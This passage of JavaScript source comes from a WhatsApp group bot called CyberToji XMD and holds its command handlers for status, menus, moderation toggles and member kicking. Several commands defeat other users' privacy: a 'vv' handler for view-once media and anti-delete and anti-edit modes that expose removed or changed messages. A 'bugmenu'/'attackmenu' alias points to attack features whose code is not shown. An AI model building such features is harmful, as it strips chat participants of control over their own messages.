          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
        });

        // Qualité selon latence
        const qualityScore = latency < 100 ? 5 : latency < 200 ? 4 : latency < 400 ? 3 : latency < 700 ? 2 : 1;
        const qualityLabel = latency < 100 ? '🟩 *Excellent*' : latency < 200 ? '🟨 *Bon*' : latency < 400 ? '🟡 *Normal*' : latency < 700 ? '🟠 *Lent*' : '🔴 *Très lent*';
        const qualityBar = '🟧'.repeat(qualityScore) + '🟥'.repeat(5 - qualityScore);

        // Uptime
        const uptimeSec = Math.floor(process.uptime());
        const uh = Math.floor(uptimeSec / 3600);
        const um = Math.floor((uptimeSec % 3600) / 60);
        const uptimeStr = uh > 0 ? `${uh}h ${um}m` : `${um} minutes`;

        // CPU cores
        const os = await import('os');
        const cpuCores = os.cpus().length;

        // Latence en secondes
        const latSec = (latency / 1000).toFixed(3);

        const pingText =
`${qualityLabel} ${qualityLabel}

📊 *SYSTEM STATUS*
${qualityBar} *ϙᴜᴀʟɪᴛʏ:* ${qualityScore}/5
⚡ *ʀᴇsᴘᴏɴsᴇ ᴛɪᴍᴇ:* \`${latSec}s\`
🖥️ *ᴄᴘᴜ ᴄᴏʀᴇs:* ${cpuCores}

⏰ *TIME INFO*
🕒 *ᴛɪᴍᴇ:* \`${timeStr}\`
📅 *ᴅᴀᴛᴇ:* \`${dateStr}\`
🌐 *ᴛɪᴍᴇᴢᴏɴᴇ:* \`AMERICA/HAÏTI\`
⏱️ *ᴜᴘᴛɪᴍᴇ:* \`${uptimeStr}\`

🔧 *TECHNICAL INFO*
🛠️ *ɴᴏᴅᴇ.js:* \`${process.version}\`

👤 *Dᴇᴠᴇʟᴏᴘᴇʀ:* ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX
🤖 *Bᴏᴛ ɴᴀᴍᴇ:* ᴄʏʙᴇʀᴛᴏᴊɪ xᴍD

▰▰▱▱▱▱▱▱▱▱

💫 *Support the project!*
⭐ Star & 🍴 Fork the repository:
🔗 https://github.com/lord007-maker/CYBERTOJI-XMD-.git

> © 𝓟𝓸𝔀𝓮𝓻𝓮𝓭 𝓫𝔂 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`;

        await sendWithImage(sock, remoteJid, 'ping', pingText, [], latency);
        await sendCmdAudio(sock, remoteJid);
        break;
      }

      case 'alive': {
        await simulateTyping(sock, remoteJid);

        // Ping rapide
        const aliveStart = Date.now();
        const aliveLatency = Date.now() - aliveStart;

        // Uptime
        const uptimeSec2 = Math.floor(process.uptime());
        const ud = Math.floor(uptimeSec2 / 86400);
        const uh2 = Math.floor((uptimeSec2 % 86400) / 3600);
        const um2 = Math.floor((uptimeSec2 % 3600) / 60);
        const upStr2 = ud > 0
          ? `${ud}d ${uh2}h ${um2}m`
          : uh2 > 0
          ? `${String(uh2).padStart(2,'0')}h ${String(um2).padStart(2,'0')}m`
          : `${String(um2).padStart(2,'0')}m`;

        const aliveText =
`✧ ───  ᴀʟɪᴠᴇ ᴀɴᴅ ʀᴇᴀᴅʏ ─── ✧
 _☁️ Sayonara everyone... just kidding!_ 

\`I'm here to serve you.\`

🕊️ Owner: ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX
⚡ Ping: ${aliveLatency}ms
⏳ Uptime: ${upStr2}
❄️ Version: 2.0.1

📢 Notice: 𝙴𝚟𝚎𝚛𝚢 𝚍𝚎𝚙𝚕𝚘𝚢𝚖𝚎𝚗𝚝 𝚒𝚝'𝚜 𝚊𝚝 𝚢𝚘𝚞𝚛 𝚘𝚠𝚗 𝚛𝚒𝚜𝚔

🌟 Repo : https://github.com/lord007-maker/CYBERTOJI-XMD-.git
▰▰▰▰▰▰▰▰▱▱ ACTIVE
─── ⋆⋅☆⋅⋆ ───
> © 𝓟𝓸𝔀𝓮𝓻𝓮𝓭 𝓫𝔂 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`;

        await sendWithImage(sock, remoteJid, 'alive', aliveText);
        await sendCmdAudio(sock, remoteJid);
        break;
      }

      case 'info':{
        await simulateTyping(sock,remoteJid);
        const _iu=Math.floor(process.uptime());
        const _up=String(Math.floor(_iu/3600)).padStart(2,'0')+'h '+String(Math.floor((_iu%3600)/60)).padStart(2,'0')+'m '+String(_iu%60).padStart(2,'0')+'s';
        const _on='✅ ON',_off='❌ OFF';
        await sendWithImage(sock,remoteJid,'info',
`🤖 *CYBERTOJI XMD — INFO*

👑 *Owner:* DOSTOEVSKY TECHX
📞 *Contact:* wa.me/50943981073
🇭🇹 *Country:* Haiti

⚙️ *Mode:* ${botMode.charAt(0).toUpperCase()+botMode.slice(1)}
📈 *Version:* v2.0.1
⏳ *Uptime:* ${_up}

🛡 *Antidelete:* ${antiDelete?_on:_off}
⚡ *Autoreact:* ${autoReact?_on:_off}
✏️ *Autotyping:* ${autoTyping?_on:_off}
⏺️ *Autorecord:* ${autoRecording?_on:_off}

🔗 https://github.com/lord007-maker/CYBERTOJI-XMD-.git`);
        break;
      }

      case 'menu':
        await handleMenu(sock, message, remoteJid, senderJid);
        // MOVED TO FINALLY (async, non-bloquant)
        break;

      case 'allmenu':
        await handleAllMenu(sock, message, remoteJid, senderJid);
        // MOVED TO FINALLY
        break;

      // ── Menus par numéro (!1 à !8) ──
      case '1': case 'ownermenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'owner'); break;
      case '2': case 'downloadmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'download'); break;
      case '3': case 'groupmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'group'); break;
      case '4': case 'utilitymenu': case 'protectionmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'utility'); break;
      case '5': case 'bugmenu': case 'attackmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'bug'); break;
      case '6': case 'stickermenu': case 'mediamenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'sticker'); break;
      case '7': case 'miscmenu': case 'generalmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'misc'); break;
      case '8': case 'imagemenu': case 'viewoncemenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'image'); break;
      case '9': case 'gamesmenu': case 'gamemenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'games'); break;

      case 'vv':
        await handleViewOnceCommand(sock, message, args, remoteJid, senderJid);
        break;

      case 'mode':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { 
            text: '⛔ Bot admin only command' 
          });
          break;
        }
        
        if (args[0] === 'private') {
          botMode = 'private';
          saveData();
          await sock.sendMessage(remoteJid, {
            text: '🔒 Mode PRIVÉ activé\nSeuls les admins peuvent utiliser le bot.'
          });
        } else if (args[0] === 'public') {
          botMode = 'public';
          saveData();
          await sock.sendMessage(remoteJid, {
            text: '🌐 Mode PUBLIC activé\nTout le monde peut utiliser le bot.'
          });
        } else {
          await sock.sendMessage(remoteJid, {
            text: `Current mode: ${botMode.toUpperCase()}\n\nUtilisation:\n${config.prefix}mode private\n${config.prefix}mode public`
          });
        }
        break;

      case 'autotyping':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        autoTyping = !autoTyping;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `⌨️ Auto-Typing: ${autoTyping ? '✅ ON' : '❌ OFF'}`
        });
        break;

      case 'autorecording':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        autoRecording = !autoRecording;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🎙️ Auto-Recording: ${autoRecording ? '✅ ON' : '❌ OFF'}`
        });
        break;

      case 'readstatus':
      case 'autostatus':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `📱 *Gestion des Status*\n\n• Lecture auto: ${autoReadStatus ? '✅ ON' : '❌ OFF'}\n• Like auto: ${autoLikeStatus ? '✅ ON' : '❌ OFF'}\n• Emoji: 🇭🇹\n\nCommandes:\n${config.prefix}readstatus read - Activer/Désactiver lecture\n${config.prefix}readstatus like - Activer/Désactiver like\n${config.prefix}readstatus all - Tout activer/désactiver`
          });
          break;
        }

        const subCmd = args[0].toLowerCase();
        switch (subCmd) {
          case 'read':
            autoReadStatus = !autoReadStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `👁️ Lecture auto des status: ${autoReadStatus ? '✅ ACTIVÉE' : '❌ DÉSACTIVÉE'}`
            });
            break;

          case 'like':
            autoLikeStatus = !autoLikeStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `🇭🇹 Like auto des status: ${autoLikeStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\nEmoji utilisé: 🇭🇹`
            });
            break;

          case 'all':
            autoReadStatus = !autoReadStatus;
            autoLikeStatus = autoReadStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `📱 Système de status: ${autoReadStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n• Lecture auto: ${autoReadStatus ? 'ON' : 'OFF'}\n• Like auto: ${autoLikeStatus ? 'ON' : 'OFF'}\n• Emoji: 🇭🇹`
            });
            break;

          default:
            await sock.sendMessage(remoteJid, {
              text: `❌ Option inconnue\n\nUtilisez:\n${config.prefix}readstatus read\n${config.prefix}readstatus like\n${config.prefix}readstatus all`
            });
        }
        break;

      case 'antibug':
      case 'anti-bug':
      case 'antibug':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleAntiBugCommand(sock, args, remoteJid, senderJid);
        break;

      case 'antidelete':
      case 'antidel':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        antiDelete = !antiDelete;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    🗑️ 𝗔𝗡𝗧𝗜-𝗗𝗘𝗟𝗘𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠    ║
╚═══════════════════════════════════╝

📊 *Statut:* ${antiDelete ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${antiDelete ? '✅ Les messages supprimés seront détectés et affichés' : '❌ Les messages supprimés ne seront plus détectés'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
  "Nothing is truly deleted"`
        });
        break;

      case 'antiedit': {
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        
        const subCmd = args[0]?.toLowerCase();
        
        if (subCmd === 'on') {
          antiEdit = true;
          await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit activé' });
        } else if (subCmd === 'off') {
          antiEdit = false;
          await sock.sendMessage(remoteJid, { text: '❌ Anti-Edit désactivé' });
        } else if (subCmd === 'set') {
          const mode = args[1]?.toLowerCase();
          if (mode === 'private') {
            antiEditMode = 'private';
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode PRIVÉ' });
          } else if (mode === 'gchat') {
            antiEditMode = 'gchat';
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode GROUPES' });
          } else if (mode === 'all') {
            antiEditMode = 'all';
            await sock.sendMessage(remoteJid, { text: '✅ Anti-Edit: mode TOUT' });
          } else {
            await sock.sendMessage(remoteJid, { 
              text: `Usage: !antiedit set private/gchat/all` 
            });
          }
        } else {
          await sock.sendMessage(remoteJid, { 
            text: `📝 *ANTI-EDIT*

Status: ${antiEdit ? '✅' : '❌'}
Mode: ${antiEditMode}

!antiedit on/off
!antiedit set private/gchat/all` 
          });
        }
        break;

        }

      case 'welcome':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminWelcome = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminWelcome && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsWelcome = getGroupSettings(remoteJid);
        settingsWelcome.welcome = !settingsWelcome.welcome;
        saveData();

        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    👋 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
╚═══════════════════════════════════╝

📊 *Statut:* ${settingsWelcome.welcome ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${settingsWelcome.welcome ? '✅ Les nouveaux membres recevront un message de bienvenue élégant with:\n\n• Nom du groupe\n• Nombre de membres\n• Liste des admins\n• Règles du groupe\n• Date et heure' : '❌ Les nouveaux membres ne recevront plus de message de bienvenue'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
        });
        break;

      case 'goodbye':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminGoodbye = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGoodbye && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsGoodbye = getGroupSettings(remoteJid);
        settingsGoodbye.goodbye = !settingsGoodbye.goodbye;
        saveData();

        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    💨 𝗚𝗢𝗢𝗗𝗕𝗬𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
╚═══════════════════════════════════╝

📊 *Statut:* ${settingsGoodbye.goodbye ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quelqu\'un quitte with:\n\n• Nom du groupe\n• Nombre de membres restants\n• Liste des admins\n• Informations utiles\n• Date et heure' : '❌ Plus de message d\'au revoir quand quelqu\'un quitte'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
        });
        break;

      case 'listactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter l'activité de tous les membres
          const activityList = [];
          for (const participant of participants) {
            const activity = groupActivity.get(participant.id);
            
            if (activity && activity.messageCount > 0) {
              activityList.push({
                jid: participant.id,
                count: activity.messageCount,
                lastالرسالة: activity.lastMessage
              });
            }
          }
          
          // Trier par nombre de messages (décroissant)
          activityList.sort((a, b) => b.count - a.count);
          
          // Top 3
          const top3 = activityList.slice(0, 3);
          const activeCount = activityList.length;
          
          // Date et heure
          const now = new Date();
          const dateStr = now.toLocaleDateString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          });
          const timeStr = now.toLocaleTimeString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          let listText = `✨ ┏━━━━━━━ 📊 🄻🄸🅂🅃🄴 🄰🄲🅃🄸🅅🄴 ━━━━━━━┓ ✨
🏆 ＴＯＰ ＣＨＡＴＴＥＲＳ ＤＵ ＭＯＭＥＮＴ 🏆\n`;

          if (top3.length > 0) {
            const medals = ['🥇', '🥈', '🥉'];
            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
            const emojis = ['✨', '⚡', '❄️'];
            
            top3.forEach((member, index) => {
              listText += `${emojis[index]} ${medals[index]} ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
              listText += `╰── 💬 ${member.count} 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌\n`;
            });
          } else {
            listText += `⚠️ Aucune activité détectée encore.\n`;
          }
          
          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 𝖲𝗍𝖺𝗍𝗂𝗌𝗍𝗂𝗊𝗎𝖾𝗌 𝖦𝗅𝗈𝖻𝖺𝗅𝖾𝗌 :
👥 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 𝖠𝖼𝗍𝗂𝗏𝖾𝗌 : ${activeCount}/${participants.length}
📈 𝖳𝖾𝗇𝖽𝖺𝗇𝖼𝖾 : ${((activeCount / participants.length) * 100).toFixed(1)}%
📅 𝖬𝗂𝗌𝖾 𝖺̀ 𝗃𝗈𝗎𝗋 : ${dateStr} | ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
💠 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖕𝖊𝖉 𝖇𝖞 @${superadmin.split('@')[0]} 💠`;

          const mentions = top3.map(m => m.jid).concat([superadmin]);
          
          await sock.sendMessage(remoteJid, {
            text: listText,
            mentions: mentions
          });
        } catch (error) {
          console.error('خطأ listactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'listinactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const threshold = args[0] ? parseInt(args[0]) : 7; // Par défaut 7 jours
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
          
          const now = Date.now();
          const thresholdMs = threshold * 24 * 60 * 60 * 1000; // Jours en millisecondes
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter les inactifs
          const inactiveList = [];
          for (const participant of participants) {
            const activity = groupActivity.get(participant.id);
            
            if (!activity || (now - activity.lastMessage) > thresholdMs) {
              const daysSinceLastMessage = activity 
                ? Math.floor((now - activity.lastMessage) / (24 * 60 * 60 * 1000))
                : 999; // Jamais parlé
              
              inactiveList.push({
                jid: participant.id,
                days: daysSinceLastMessage
              });
            }
          }
          
          // Trier par inactivité (décroissant)
          inactiveList.sort((a, b) => b.days - a.days);
          
          // Top 3
          const top3 = inactiveList.slice(0, 3);
          const inactiveCount = inactiveList.length;
          
          // Date et heure
          const nowDate = new Date();
          const dateStr = nowDate.toLocaleDateString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          });
          const timeStr = nowDate.toLocaleTimeString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          let listText = `⚠️ ┏━━━━━━━ ⚡ 🅂🄲🄰🄽 🄸🄽🄰🄲🅃🄸🄵 ━━━━━━━┓ ⚠️
🌑 ＭＥＭＢＲＥＳ ＥＮ ＳＯＭＭＥＩＬ 🌑\n`;

          if (top3.length > 0) {
            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
            
            top3.forEach((member, index) => {
              const daysText = member.days >= 999 ? 'Jamais actif' : `${member.days} 𝗃𝗈𝗎𝗋𝗌`;
              listText += `🛑 ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
              listText += `╰── ⏳ 𝖣𝖾𝗋𝗇𝗂𝖾𝗋 𝗆𝗌𝗀 : ${daysText}\n`;
            });
          } else {
            listText += `✅ Tous les membres sont actifs!\n`;
          }
          
          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
📉 𝖤́𝗍𝖺𝗍 𝖽𝗎 𝖲𝗒𝗌𝗍𝖾̀𝗆𝖾 :
💤 𝖨𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝖽𝖾́𝗍𝖾𝖼𝗍𝖾́𝗌 : ${inactiveCount}/${participants.length}
⚙️ 𝖲𝖾𝗎𝗂𝗅 𝖽𝖾 𝗍𝗈𝗅𝖾́𝗋𝖺𝗇𝖼𝖾 : ${threshold} 𝗃𝗈𝗎𝗋𝗌
🚨 𝖠𝗍𝗍𝖾𝗇𝗍𝗂𝗈𝗇 : 𝖫𝖾𝗌 𝗆𝖾𝗆𝖻𝗋𝖾𝗌 𝗂𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝗋𝗂𝗌𝗊𝗎𝖾𝗇𝗍
𝗎𝗇𝖾 𝖾𝗑𝗉𝗎𝗅𝗌𝗂𝗈𝗇 𝖺𝗎𝗍𝗈𝗆𝖺𝗍𝗂𝗊𝗎𝖾.
📅 ${dateStr} | ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
💠 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖉𝖒𝖎𝖓 : @${superadmin.split('@')[0]} 💠`;

          const mentions = top3.map(m => m.jid).concat([superadmin]);
          
          await sock.sendMessage(remoteJid, {
            text: listText,
            mentions: mentions
          });
        } catch (error) {
          console.error('خطأ listinactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'kickinactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminKickInactive = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminKickInactive && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminKickInactive = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminKickInactive) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin' });
          break;
        }

        try {
          const thresholdDays = args[0] ? parseInt(args[0]) : 7;
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          
          const now = Date.now();
          const thresholdMs = thresholdDays * 24 * 60 * 60 * 1000;
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter les inactifs à expulser
          const toKick = [];
          for (const participant of participants) {
            // Ne pas expulser les admins
            if (participant.admin) continue;
            
            const activity = groupActivity.get(participant.id);
            
            if (!activity || (now - activity.lastMessage) > thresholdMs) {
              toKick.push(participant.id);
            }
          }
          
          if (toKick.length === 0) {
            await sock.sendMessage(remoteJid, {
              text: `✅ Aucun membre inactif détecté (seuil: ${thresholdDays} jours)`
            });
            break;
          }
          
          await sock.sendMessage(remoteJid, {
            text: `⚡ Expulsion des membres inactifs...\n\n🎯 ${toKick.length} membre(s) seront expulsés`
          });
          
          // Expulser par batch de 10
          let kicked = 0;
          for (let i = 0; i < toKick.length; i += 10) {
            const batch = toKick.slice(i, i + 10);
            try {
              await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
              kicked += batch.length;
              await delay(1000);
            } catch (error) {
              console.error('خطأ kicking batch:', error);
            }
          }
          
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║   ⚡ 𝗞𝗜𝗖𝗞 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧  ║
╚═══════════════════════════════════╝

✅ *Expulsions effectuées:* ${kicked}/${toKick.length}
⏰ *Seuil d'inactivité:* ${thresholdDays} jours
📊 *Membres restants:* ${participants.length - kicked}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
          });
        } catch (error) {
          console.error('خطأ kickinactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'autoreact':
        await handleAutoReactCommand(sock, args, remoteJid, senderJid);
        break;

      case 'tagall':
        await handleTagAll(sock, message, args, remoteJid, isGroup, senderJid);
        break;

      case 'hidetag':
      case 'htag':
      case 'invisibletag': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        try {
          const metadata     = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants.map(p => p.id);
          const tagMsg       = args.join(' ') || '';

          // Construire les mentions avec texte invisible (caractère U+2060 word-joiner)
          const invisibleMentions = participants.map(() => '⁠').join('');

          await sock.sendMessage(remoteJid, {
            text:     tagMsg || '⁠',   // Texte invisible si pas d'argument
            mentions: participants           // Tous tagués silencieusement
          });

          try { await sock.sendMessage(remoteJid, { react: { text: '👻', key: message.key } }); } catch(e) {}
        } catch(e) {
          console.error('[hidetag]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'kickall':
        await handleKickAll(sock, remoteJid, isGroup, senderJid);
        break;

      case 'leave':
        await handleLeave(sock, remoteJid, isGroup, senderJid);
        break;

      case 'status':
        await sock.sendMessage(remoteJid, {
          text: `📊 *Statut du Bot*

🤖 الوضع: ${botMode}
⌨️ Typing: ${autoTyping ? 'ON' : 'OFF'}
🎙️ Recording: ${autoRecording ? 'ON' : 'OFF'}
😊 React: ${autoReact ? 'ON' : 'OFF'}
👁️ VV: ${savedViewOnce.get(senderJid)?.length || 0}

👨‍💻 Votre JID:
${senderJid}

🔐 Admin: ${isAdmin(senderJid) ? '✅ OUI' : '❌ NON'}`
        });
        break;

      case 'bible':
        await handleBibleCommand(sock, args, remoteJid);
        break;

      case 'terms':
      case 'termes':
      case 'rules':
        await handleTermsCommand(sock, remoteJid, senderJid);
        break;

      case 'dev':
      case 'developer':
      case 'owner':
      case 'contact':
        await simulateTyping(sock, remoteJid);
        await sendWithImage(sock, remoteJid, 'dev',
`╔═══════════════════════════════════╗
║     👨‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗜𝗡𝗙𝗢     ║
╚═══════════════════════════════════╝

👑 *Lord Dev Dostoevsky* 🇭🇹

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 *CONTACT:*
1️⃣  wa.me/50944908407
2️⃣  wa.me/50943981073
3️⃣  wa.me/67078035882

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💼 *SERVICES:*
• Développement de bots WhatsApp
• Scripts personnalisés
• Support technique & consulting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 CyberToji XMD v4.0.0
✨ Made with ❤️ in Haiti 🇭🇹`);
        break;

      case 'checkban':
      case 'checkspam':
      case 'bancheck':
      case 'isbanned':
        await handleCheckBan(sock, args, remoteJid, message, senderJid);
        break;

      // =============================================
      // COMMANDES ANTI
      // =============================================

      case 'antilink':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdmin && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settings = initGroupSettings(remoteJid);
        settings.antilink = !settings.antilink;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🔗 Anti-Link: ${settings.antilink ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settings.antilink ? 'Les liens seront bloqués et les membres avertis.' : 'Les liens sont maintenant autorisés.'}`
        });
        break;

      case 'antibot':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminBot = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminBot && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsBot = initGroupSettings(remoteJid);
        settingsBot.antibot = !settingsBot.antibot;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🤖 Anti-Bot: ${settingsBot.antibot ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settingsBot.antibot ? 'Les bots seront automatiquement expulsés.' : 'Les bots sont maintenant autorisés.'}`
        });
        break;

      case 'antitag':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminTag = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminTag && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsTag = initGroupSettings(remoteJid);
        settingsTag.antitag = !settingsTag.antitag;
        saveData();
        
        await sock.sendMessage(remoteJid, {
          text: `🏷️ Anti-Tag: ${settingsTag.antitag ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settingsTag.antitag ? 'Les tags massifs (>5) seront bloqués.' : 'Les tags massifs sont maintenant autorisés.'}`
        });
        break;

      case 'antispam':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminSpam = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminSpam && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsSpam = initGroupSettings(remoteJid);
        settingsSpam.antispam = !settingsSpam.antispam;
        saveData();
        
        await sock.sendMessage(remoteJid, {
